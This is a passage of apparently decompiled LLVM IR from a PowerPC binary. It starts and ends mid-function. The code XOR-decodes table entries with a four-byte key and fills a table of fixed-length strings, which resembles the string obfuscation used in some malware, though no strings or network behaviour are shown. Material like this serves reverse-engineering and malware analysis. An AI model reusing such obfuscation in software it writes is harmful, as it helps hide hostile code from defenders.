  %v3_1000a2bc = inttoptr i32 %v2_1000a2bc to i8*
  %v4_1000a2bc = load i8, i8* %v3_1000a2bc, align 1
  %v5_1000a2bc = zext i8 %v4_1000a2bc to i32
  %v2_1000a2c0 = xor i32 %v5_1000a2bc, %v1_1000a28c
  %v3_1000a2c4 = trunc i32 %v2_1000a2c0 to i8
  store i8 %v3_1000a2c4, i8* %v3_1000a2bc, align 1
  %v2_1000a2c8 = load i32, i32* %v1_1000a298, align 4
  %v0_1000a2cc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a2cc = add i32 %v0_1000a2cc, %v2_1000a2c8
  %v3_1000a2cc = inttoptr i32 %v2_1000a2cc to i8*
  %v4_1000a2cc = load i8, i8* %v3_1000a2cc, align 1
  %v5_1000a2cc = zext i8 %v4_1000a2cc to i32
  %v0_1000a2d0 = load i32, i32* @r5, align 4
  %v2_1000a2d0 = xor i32 %v0_1000a2d0, %v5_1000a2cc
  %v3_1000a2d4 = trunc i32 %v2_1000a2d0 to i8
  store i8 %v3_1000a2d4, i8* %v3_1000a2cc, align 1
  %v0_1000a2d8 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a2d8 = add i32 %v0_1000a2d8, 1
  store i32 %v1_1000a2d8, i32* %r10.global-to-local, align 4
  %v3_1000a2dc = load i16, i16* %v2_1000a274, align 4
  %v4_1000a2dc = zext i16 %v3_1000a2dc to i32
  %v2_1000a2e0 = icmp slt i32 %v4_1000a2dc, %v1_1000a2d8
  %v3_1000a2e0 = icmp sgt i32 %v4_1000a2dc, %v1_1000a2d8
  %v4_1000a2e0 = icmp eq i32 %v4_1000a2dc, %v1_1000a2d8
  store i1 %v2_1000a2e0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a2e0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a2e0, label %dec_label_pc_1000a298, label %dec_label_pc_1000a2e8

dec_label_pc_1000a2e8:                            ; preds = %dec_label_pc_1000a298
  ret i32 %v2_1000a26c

; uselistorder directives
  uselistorder i32 %v4_1000a2dc, { 2, 1, 0 }
  uselistorder i32 %v1_1000a2d8, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1000a27c, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000a264, { 1, 0 }
}

define i32 @function_1000a2ec(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a2ec:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_1000a2f0 = mul i32 %arg1, 8
  %v2_1000a2f8 = add i32 %v1_1000a2f0, ptrtoint (i32* @global_var_1001ec1c.282 to i32)
  %v1_1000a300 = add i32 %v1_1000a2f0, add (i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), i32 4)
  %v2_1000a300 = inttoptr i32 %v1_1000a300 to i16*
  %v3_1000a300 = load i16, i16* %v2_1000a300, align 4
  %v3_1000a304 = icmp eq i16 %v3_1000a300, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a304, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a308 = load i32, i32* @global_var_1001eafc.283, align 4
  %v1_1000a30c = udiv i32 %v3_1000a308, 16777216
  store i32 %v1_1000a30c, i32* @r5, align 4
  %v1_1000a310 = urem i32 %v3_1000a308, 256
  store i32 %v1_1000a310, i32* %r6.global-to-local, align 4
  %v1_1000a314 = call i32 @__asm_rlwinm(i32 %v3_1000a308, i32 24, i32 24, i32 31)
  %v1_1000a318 = call i32 @__asm_rlwinm(i32 %v3_1000a308, i32 16, i32 24, i32 31)
  %v0_1000a31c = load i32, i32* @lr, align 4
  %v1_1000a31c = load i1, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a31c = load i1, i1* %cr7_lt.global-to-local, align 1
  %v3_1000a31c = or i1 %v1_1000a31c, %v2_1000a31c
  call void @__pseudo_cond_branch(i1 %v3_1000a31c, i32 %v0_1000a31c)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_1000a324 = inttoptr i32 %v2_1000a2f8 to i32*
  br label %dec_label_pc_1000a324

dec_label_pc_1000a324:                            ; preds = %dec_label_pc_1000a324, %dec_label_pc_1000a2ec
  %v1_1000a330 = phi i32 [ %v1_1000a364, %dec_label_pc_1000a324 ], [ 0, %dec_label_pc_1000a2ec ]
  %v2_1000a324 = load i32, i32* %v1_1000a324, align 4
  %v2_1000a328 = add i32 %v2_1000a324, %v1_1000a330
  %v3_1000a328 = inttoptr i32 %v2_1000a328 to i8*
  %v4_1000a328 = load i8, i8* %v3_1000a328, align 1
  %v5_1000a328 = zext i8 %v4_1000a328 to i32
  %v0_1000a32c = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a32c = xor i32 %v0_1000a32c, %v5_1000a328
  %v3_1000a330 = trunc i32 %v2_1000a32c to i8
  store i8 %v3_1000a330, i8* %v3_1000a328, align 1
  %v2_1000a334 = load i32, i32* %v1_1000a324, align 4
  %v0_1000a338 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a338 = add i32 %v0_1000a338, %v2_1000a334
  %v3_1000a338 = inttoptr i32 %v2_1000a338 to i8*
  %v4_1000a338 = load i8, i8* %v3_1000a338, align 1
  %v5_1000a338 = zext i8 %v4_1000a338 to i32
  %v2_1000a33c = xor i32 %v5_1000a338, %v1_1000a314
  %v3_1000a340 = trunc i32 %v2_1000a33c to i8
  store i8 %v3_1000a340, i8* %v3_1000a338, align 1
  %v2_1000a344 = load i32, i32* %v1_1000a324, align 4
  %v0_1000a348 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a348 = add i32 %v0_1000a348, %v2_1000a344
  %v3_1000a348 = inttoptr i32 %v2_1000a348 to i8*
  %v4_1000a348 = load i8, i8* %v3_1000a348, align 1
  %v5_1000a348 = zext i8 %v4_1000a348 to i32
  %v2_1000a34c = xor i32 %v5_1000a348, %v1_1000a318
  %v3_1000a350 = trunc i32 %v2_1000a34c to i8
  store i8 %v3_1000a350, i8* %v3_1000a348, align 1
  %v2_1000a354 = load i32, i32* %v1_1000a324, align 4
  %v0_1000a358 = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a358 = add i32 %v0_1000a358, %v2_1000a354
  %v3_1000a358 = inttoptr i32 %v2_1000a358 to i8*
  %v4_1000a358 = load i8, i8* %v3_1000a358, align 1
  %v5_1000a358 = zext i8 %v4_1000a358 to i32
  %v0_1000a35c = load i32, i32* @r5, align 4
  %v2_1000a35c = xor i32 %v0_1000a35c, %v5_1000a358
  %v3_1000a360 = trunc i32 %v2_1000a35c to i8
  store i8 %v3_1000a360, i8* %v3_1000a358, align 1
  %v0_1000a364 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a364 = add i32 %v0_1000a364, 1
  store i32 %v1_1000a364, i32* %r10.global-to-local, align 4
  %v3_1000a368 = load i16, i16* %v2_1000a300, align 4
  %v4_1000a368 = zext i16 %v3_1000a368 to i32
  %v2_1000a36c = icmp slt i32 %v4_1000a368, %v1_1000a364
  %v3_1000a36c = icmp sgt i32 %v4_1000a368, %v1_1000a364
  %v4_1000a36c = icmp eq i32 %v4_1000a368, %v1_1000a364
  store i1 %v2_1000a36c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a36c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000a36c, label %dec_label_pc_1000a324, label %dec_label_pc_1000a374

dec_label_pc_1000a374:                            ; preds = %dec_label_pc_1000a324
  ret i32 %v2_1000a2f8

; uselistorder directives
  uselistorder i32 %v4_1000a368, { 2, 1, 0 }
  uselistorder i32 %v1_1000a364, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v3_1000a308, { 2, 3, 1, 0 }
  uselistorder i32 %v1_1000a2f0, { 1, 0 }
  uselistorder i32 16777216, { 0, 1, 2, 3, 8, 4, 9, 5, 10, 6, 11, 7, 13, 12, 15, 14 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), i32 4), { 1, 2, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), { 1, 3, 0, 2, 4 }
}

define i32 @function_1000a378() local_unnamed_addr {
dec_label_pc_1000a378:
  %r21.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r24.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r26.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  store i32 12, i32* @r3, align 4
  %v0_1000a384 = load i32, i32* @r28, align 4
  store i32 ptrtoint ([13 x i8]* @global_var_1000e138.284 to i32), i32* @r28, align 4
  store i32 19, i32* %r21.global-to-local, align 4
  store i32 16, i32* %r22.global-to-local, align 4
  store i32 11, i32* %r23.global-to-local, align 4
  store i32 8, i32* %r24.global-to-local, align 4
  store i32 12, i32* %r25.global-to-local, align 4
  store i32 2, i32* %r26.global-to-local, align 4
  store i32 268477392, i32* @lr, align 4
  %v0_1000a3cc = call i32 @function_1000c3f0()
  %v0_1000a3d4 = load i32, i32* @r28, align 4
  store i32 %v0_1000a3cc, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a3e8.285 to i32), i32* @lr, align 4
  %v4_1000a3e4 = call i32 @function_1000abe8(i32 %v0_1000a3d4, i32 12, i32 12)
  store i32 2, i32* @r3, align 4
  store i32 %v0_1000a3cc, i32* @global_var_1001ec34.286, align 4
  %v0_1000a3f0 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a3f0 = trunc i32 %v0_1000a3f0 to i16
  store i16 %v1_1000a3f0, i16* bitcast (i32* @global_var_1001ec38.287 to i16*), align 4
  store i32 268477432, i32* @lr, align 4
  %v0_1000a3f4 = call i32 @function_1000c3f0()
  store i32 %v0_1000a3f4, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a40c.289 to i32), i32* @lr, align 4
  %v3_1000a408 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e148.288 to i32), i32 2, i32 2)
  store i32 12, i32* @r3, align 4
  store i32 %v0_1000a3f4, i32* @global_var_1001ec3c.290, align 4
  %v0_1000a414 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000a414 = trunc i32 %v0_1000a414 to i16
  store i16 %v1_1000a414, i16* bitcast (i32* @global_var_1001ec40.291 to i16*), align 4
  store i32 268477468, i32* @lr, align 4
  %v0_1000a418 = call i32 @function_1000c3f0()
  %v0_1000a41c = load i32, i32* @r28, align 4
  store i32 %v0_1000a418, i32* %r27.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a42c.292 to i32), i32* @lr, align 4
  %v4_1000a428 = call i32 @function_1000abe8(i32 %v0_1000a41c, i32 12, i32 12)
  store i32 2, i32* @r3, align 4
  store i32 %v0_1000a418, i32* @global_var_1001ecac.293, align 4
  %v0_1000a434 = load i32, i32* %r25.global-to-local, align 4
  %v1_1000a434 = trunc i32 %v0_1000a434 to i16
  store i16 %v1_1000a434, i16* bitcast (i32* @global_var_1001ecb0.294 to i16*), align 4
  store i32 268477500, i32* @lr, align 4
  %v0_1000a438 = call i32 @function_1000c3f0()
  store i32 %v0_1000a438, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a450.296 to i32), i32* @lr, align 4
  %v3_1000a44c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e14c.295 to i32), i32 2, i32 2)
  store i32 15, i32* @r3, align 4
  %v0_1000a454 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a454, i32* @global_var_1001ecb4.297, align 4
  store i32 7, i32* %r27.global-to-local, align 4
  %v0_1000a45c = load i32, i32* %r26.global-to-local, align 4
  %v1_1000a45c = trunc i32 %v0_1000a45c to i16
  store i16 %v1_1000a45c, i16* bitcast (i32* @global_var_1001ecb8.298 to i16*), align 4
  store i32 268477540, i32* @lr, align 4
  %v0_1000a460 = call i32 @function_1000c3f0()
  store i32 %v0_1000a460, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a478.300 to i32), i32* @lr, align 4
  %v3_1000a474 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e150.299 to i32), i32 15, i32 15)
  store i32 29, i32* @r3, align 4
  store i16 15, i16* bitcast (i32* @global_var_1001ec30.301 to i16*), align 4
  %v0_1000a484 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a484, i32* @global_var_1001ec2c.302, align 4
  store i32 268477580, i32* @lr, align 4
  %v0_1000a488 = call i32 @function_1000c3f0()
  store i32 %v0_1000a488, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a4a0.304 to i32), i32* @lr, align 4
  %v3_1000a49c = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e160.303 to i32), i32 29, i32 29)
  store i32 7, i32* @r3, align 4
  store i16 29, i16* bitcast (i32* @global_var_1001ec48.305 to i16*), align 4
  %v0_1000a4ac = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a4ac, i32* @global_var_1001ec44.306, align 4
  store i32 268477620, i32* @lr, align 4
  %v0_1000a4b0 = call i32 @function_1000c3f0()
  store i32 %v0_1000a4b0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a4c8.308 to i32), i32* @lr, align 4
  %v4_1000a4c4 = call i32 @function_1000abe8(i32 ptrtoint ([8 x i8]* @global_var_1000e180.307 to i32), i32 7, i32 7)
  store i32 5, i32* @r3, align 4
  %v0_1000a4cc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a4cc, i32* @global_var_1001ec4c.309, align 4
  store i32 10, i32* %r26.global-to-local, align 4
  %v0_1000a4d4 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a4d4 = trunc i32 %v0_1000a4d4 to i16
  store i16 %v1_1000a4d4, i16* bitcast (i32* @global_var_1001ec50.310 to i16*), align 4
  store i32 268477660, i32* @lr, align 4
  %v0_1000a4d8 = call i32 @function_1000c3f0()
  store i32 %v0_1000a4d8, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a4f0.312 to i32), i32* @lr, align 4
  %v4_1000a4ec = call i32 @function_1000abe8(i32 ptrtoint ([6 x i8]* @global_var_1000e188.311 to i32), i32 5, i32 5)
  store i32 11, i32* @r3, align 4
  store i16 5, i16* bitcast (i32* @global_var_1001ec58.313 to i16*), align 4
  %v0_1000a4fc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a4fc, i32* @global_var_1001ec54.314, align 4
  store i32 268477700, i32* @lr, align 4
  %v0_1000a500 = call i32 @function_1000c3f0()
  store i32 %v0_1000a500, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a518.316 to i32), i32* @lr, align 4
  %v3_1000a514 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e190.315 to i32), i32 11, i32 11)
  store i32 4, i32* @r3, align 4
  %v0_1000a51c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a51c, i32* @global_var_1001ec5c.317, align 4
  %v0_1000a520 = load i32, i32* %r23.global-to-local, align 4
  %v1_1000a520 = trunc i32 %v0_1000a520 to i16
  store i16 %v1_1000a520, i16* bitcast (i32* @global_var_1001ec60.318 to i16*), align 4
  store i32 268477736, i32* @lr, align 4
  %v0_1000a524 = call i32 @function_1000c3f0()
  store i32 %v0_1000a524, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a53c.320 to i32), i32* @lr, align 4
  %v4_1000a538 = call i32 @function_1000abe8(i32 ptrtoint ([5 x i8]* @global_var_1000e19c.319 to i32), i32 4, i32 4)
  store i32 7, i32* @r3, align 4
  store i16 4, i16* bitcast (i32* @global_var_1001ec68.321 to i16*), align 4
  %v0_1000a548 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a548, i32* @global_var_1001ec64.322, align 4
  store i32 268477776, i32* @lr, align 4
  %v0_1000a54c = call i32 @function_1000c3f0()
  store i32 %v0_1000a54c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a564.324 to i32), i32* @lr, align 4
  %v4_1000a560 = call i32 @function_1000abe8(i32 ptrtoint ([8 x i8]* @global_var_1000e1a4.323 to i32), i32 7, i32 7)
  store i32 8, i32* @r3, align 4
  %v0_1000a568 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a568, i32* @global_var_1001ec6c.325, align 4
  %v0_1000a56c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a56c = trunc i32 %v0_1000a56c to i16
  store i16 %v1_1000a56c, i16* bitcast (i32* @global_var_1001ec70.326 to i16*), align 4
  store i32 268477812, i32* @lr, align 4
  %v0_1000a570 = call i32 @function_1000c3f0()
  store i32 %v0_1000a570, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a588.328 to i32), i32* @lr, align 4
  %v4_1000a584 = call i32 @function_1000abe8(i32 ptrtoint ([9 x i8]* @global_var_1000e1ac.327 to i32), i32 8, i32 8)
  store i32 13, i32* @r3, align 4
  %v0_1000a58c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a58c, i32* @global_var_1001ec74.329, align 4
  %v0_1000a590 = load i32, i32* %r24.global-to-local, align 4
  %v1_1000a590 = trunc i32 %v0_1000a590 to i16
  store i16 %v1_1000a590, i16* bitcast (i32* @global_var_1001ec78.330 to i16*), align 4
  store i32 268477848, i32* @lr, align 4
  %v0_1000a594 = call i32 @function_1000c3f0()
  store i32 %v0_1000a594, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a5ac.332 to i32), i32* @lr, align 4
  %v3_1000a5a8 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e1b8.331 to i32), i32 13, i32 13)
  store i32 10, i32* @r3, align 4
  store i16 13, i16* bitcast (i32* @global_var_1001ec80.333 to i16*), align 4
  %v0_1000a5b8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a5b8, i32* @global_var_1001ec7c.334, align 4
  store i32 268477888, i32* @lr, align 4
  %v0_1000a5bc = call i32 @function_1000c3f0()
  store i32 %v0_1000a5bc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a5d4.336 to i32), i32* @lr, align 4
  %v4_1000a5d0 = call i32 @function_1000abe8(i32 ptrtoint ([11 x i8]* @global_var_1000e1c8.335 to i32), i32 10, i32 10)
  store i32 10, i32* @r3, align 4
  %v0_1000a5d8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a5d8, i32* @global_var_1001ec84.337, align 4
  %v0_1000a5dc = load i32, i32* %r26.global-to-local, align 4
  %v1_1000a5dc = trunc i32 %v0_1000a5dc to i16
  store i16 %v1_1000a5dc, i16* bitcast (i32* @global_var_1001ec88.338 to i16*), align 4
  store i32 268477924, i32* @lr, align 4
  %v0_1000a5e0 = call i32 @function_1000c3f0()
  store i32 %v0_1000a5e0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a5f8.340 to i32), i32* @lr, align 4
  %v4_1000a5f4 = call i32 @function_1000abe8(i32 ptrtoint ([11 x i8]* @global_var_1000e1d4.339 to i32), i32 10, i32 10)
  store i32 33, i32* @r3, align 4
  %v0_1000a5fc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a5fc, i32* @global_var_1001ec8c.341, align 4
  %v0_1000a600 = load i32, i32* %r26.global-to-local, align 4
  %v1_1000a600 = trunc i32 %v0_1000a600 to i16
  store i16 %v1_1000a600, i16* bitcast (i32* @global_var_1001ec90.342 to i16*), align 4
  store i32 268477960, i32* @lr, align 4
  %v0_1000a604 = call i32 @function_1000c3f0()
  store i32 %v0_1000a604, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a61c.344 to i32), i32* @lr, align 4
  %v3_1000a618 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e1e0.343 to i32), i32 33, i32 33)
  store i32 8, i32* @r3, align 4
  store i16 33, i16* bitcast (i32* @global_var_1001ec98.345 to i16*), align 4
  %v0_1000a628 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a628, i32* @global_var_1001ec94.346, align 4
  store i32 268478000, i32* @lr, align 4
  %v0_1000a62c = call i32 @function_1000c3f0()
  store i32 %v0_1000a62c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a644.348 to i32), i32* @lr, align 4
  %v4_1000a640 = call i32 @function_1000abe8(i32 ptrtoint ([9 x i8]* @global_var_1000e204.347 to i32), i32 8, i32 8)
  store i32 11, i32* @r3, align 4
  %v0_1000a648 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a648, i32* @global_var_1001ec9c.349, align 4
  %v0_1000a64c = load i32, i32* %r24.global-to-local, align 4
  %v1_1000a64c = trunc i32 %v0_1000a64c to i16
  store i16 %v1_1000a64c, i16* bitcast (i32* @global_var_1001eca0.350 to i16*), align 4
  store i32 268478036, i32* @lr, align 4
  %v0_1000a650 = call i32 @function_1000c3f0()
  store i32 %v0_1000a650, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a668.352 to i32), i32* @lr, align 4
  %v4_1000a664 = call i32 @function_1000abe8(i32 ptrtoint ([12 x i8]* @global_var_1000e210.351 to i32), i32 11, i32 11)
  store i32 6, i32* @r3, align 4
  %v0_1000a66c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a66c, i32* @global_var_1001eca4.353, align 4
  %v0_1000a670 = load i32, i32* %r23.global-to-local, align 4
  %v1_1000a670 = trunc i32 %v0_1000a670 to i16
  store i16 %v1_1000a670, i16* bitcast (i32* @global_var_1001eca8.354 to i16*), align 4
  store i32 268478072, i32* @lr, align 4
  %v0_1000a674 = call i32 @function_1000c3f0()
  store i32 %v0_1000a674, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a68c.356 to i32), i32* @lr, align 4
  %v4_1000a688 = call i32 @function_1000abe8(i32 ptrtoint ([7 x i8]* @global_var_1000e21c.355 to i32), i32 6, i32 6)
  store i32 7, i32* @r3, align 4
  store i16 6, i16* bitcast (i32* @global_var_1001ecc0.357 to i16*), align 4
  %v0_1000a698 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a698, i32* @global_var_1001ecbc.358, align 4
  store i32 268478112, i32* @lr, align 4
  %v0_1000a69c = call i32 @function_1000c3f0()
  store i32 %v0_1000a69c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a6b4.360 to i32), i32* @lr, align 4
  %v4_1000a6b0 = call i32 @function_1000abe8(i32 ptrtoint ([8 x i8]* @global_var_1000e224.359 to i32), i32 7, i32 7)
  store i32 7, i32* @r3, align 4
  %v0_1000a6b8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a6b8, i32* @global_var_1001ecc4.361, align 4
  %v0_1000a6bc = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a6bc = trunc i32 %v0_1000a6bc to i16
  store i16 %v1_1000a6bc, i16* bitcast (i32* @global_var_1001ecc8.362 to i16*), align 4
  store i32 268478148, i32* @lr, align 4
  %v0_1000a6c0 = call i32 @function_1000c3f0()
  store i32 %v0_1000a6c0, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a6d8.364 to i32), i32* @lr, align 4
  %v4_1000a6d4 = call i32 @function_1000abe8(i32 ptrtoint ([8 x i8]* @global_var_1000e22c.363 to i32), i32 7, i32 7)
  store i32 3, i32* @r3, align 4
  %v0_1000a6dc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a6dc, i32* @global_var_1001eccc.365, align 4
  %v0_1000a6e0 = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a6e0 = trunc i32 %v0_1000a6e0 to i16
  store i16 %v1_1000a6e0, i16* bitcast (i32* @global_var_1001ecd0.366 to i16*), align 4
  store i32 268478184, i32* @lr, align 4
  %v0_1000a6e4 = call i32 @function_1000c3f0()
  store i32 %v0_1000a6e4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a6fc.368 to i32), i32* @lr, align 4
  %v4_1000a6f8 = call i32 @function_1000abe8(i32 ptrtoint ([4 x i8]* @global_var_1000e234.367 to i32), i32 3, i32 3)
  store i32 19, i32* @r3, align 4
  store i16 3, i16* bitcast (i32* @global_var_1001ecd8.369 to i16*), align 4
  %v0_1000a708 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a708, i32* @global_var_1001ecd4.370, align 4
  store i32 268478224, i32* @lr, align 4
  %v0_1000a70c = call i32 @function_1000c3f0()
  store i32 %v0_1000a70c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a724.372 to i32), i32* @lr, align 4
  %v3_1000a720 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e238.371 to i32), i32 19, i32 19)
  store i32 24, i32* @r3, align 4
  %v0_1000a728 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a728, i32* @global_var_1001ecdc.373, align 4
  store i32 9, i32* %r27.global-to-local, align 4
  %v0_1000a730 = load i32, i32* %r21.global-to-local, align 4
  %v1_1000a730 = trunc i32 %v0_1000a730 to i16
  store i16 %v1_1000a730, i16* bitcast (i32* @global_var_1001ece0.374 to i16*), align 4
  store i32 268478264, i32* @lr, align 4
  %v0_1000a734 = call i32 @function_1000c3f0()
  store i32 %v0_1000a734, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a74c.376 to i32), i32* @lr, align 4
  %v3_1000a748 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e24c.375 to i32), i32 24, i32 24)
  store i32 9, i32* @r3, align 4
  store i16 24, i16* bitcast (i32* @global_var_1001ece8.377 to i16*), align 4
  %v0_1000a758 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a758, i32* @global_var_1001ece4.378, align 4
  store i32 268478304, i32* @lr, align 4
  %v0_1000a75c = call i32 @function_1000c3f0()
  store i32 %v0_1000a75c, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a774.380 to i32), i32* @lr, align 4
  %v4_1000a770 = call i32 @function_1000abe8(i32 ptrtoint ([10 x i8]* @global_var_1000e268.379 to i32), i32 9, i32 9)
  store i32 16, i32* @r3, align 4
  %v0_1000a778 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a778, i32* @global_var_1001ecec.381, align 4
  %v0_1000a77c = load i32, i32* %r27.global-to-local, align 4
  %v1_1000a77c = trunc i32 %v0_1000a77c to i16
  store i16 %v1_1000a77c, i16* bitcast (i32* @global_var_1001ecf0.382 to i16*), align 4
  store i32 268478340, i32* @lr, align 4
  %v0_1000a780 = call i32 @function_1000c3f0()
  store i32 %v0_1000a780, i32* %r28.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000a798.384 to i32), i32* @lr, align 4
  %v3_1000a794 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e274.383 to i32), i32 16, i32 16)
  store i32 22, i32* @r3, align 4
  %v0_1000a79c = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a79c, i32* @global_var_1001ecf4.385, align 4
  %v0_1000a7a0 = load i32, i32* %r22.global-to-local, align 4
  %v1_1000a7a0 = trunc i32 %v0_1000a7a0 to i16
  store i16 %v1_1000a7a0, i16* bitcast (i32* @global_var_1001ecf8.386 to i16*), align 4
  store i32 268478376, i32* @lr, align 4
  %v0_1000a7a4 = call i32 @function_1000c3f0()
  store i32 %v0_1000a7a4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a7bc.388 to i32), i32* @lr, align 4
  %v3_1000a7b8 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e288.387 to i32), i32 22, i32 22)
  store i32 21, i32* @r3, align 4
  store i16 22, i16* bitcast (i32* @global_var_1001ed00.389 to i16*), align 4
  %v0_1000a7c8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a7c8, i32* @global_var_1001ecfc.390, align 4
  store i32 268478416, i32* @lr, align 4
  %v0_1000a7cc = call i32 @function_1000c3f0()
  store i32 %v0_1000a7cc, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a7e4.392 to i32), i32* @lr, align 4
  %v3_1000a7e0 = call i32 @function_1000abe8(i32 ptrtoint (i32* @global_var_1000e2a0.391 to i32), i32 21, i32 21)
  store i32 17, i32* @r3, align 4
  store i16 21, i16* bitcast (i32* @global_var_1001ed08.393 to i16*), align 4
  %v0_1000a7f0 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_1000a7f0, i32* @global_var_1001ed04.394, align 4
  store i32 268478456, i32* @lr, align 4
  %v0_1000a7f4 = call i32 @function_1000c3f0()
  store i32 %v0_1000a7f4, i32* %r28.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000a80c.396 to i32), i32* @lr, align 4
  %v4_1000a808 = call i32 @function_1000abe8(i32 ptrtoint ([18 x i8]* @global_var_1000e2b8.395 to i32), i32 17, i32 17)
  store i32 12, i32* @r3, align 4
  store i16 17, i16* bitcast (i32* @global_var_1001ed10.397 to i16*), align 4
